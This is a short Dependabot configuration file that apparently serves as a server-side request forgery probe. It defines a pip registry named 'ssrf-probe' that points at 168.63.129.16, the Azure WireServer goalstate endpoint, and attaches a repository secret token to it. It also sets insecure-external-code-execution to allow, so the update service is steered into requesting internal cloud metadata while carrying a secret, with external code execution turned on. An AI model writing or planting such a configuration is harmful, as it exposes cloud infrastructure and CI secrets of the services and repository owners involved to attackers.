version: 2
registries:
  ssrf-probe:
    type: python-index
    url: http://168.63.129.16/machine/?comp=goalstate&x-ms-version=2020-06-01#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - ssrf-probe
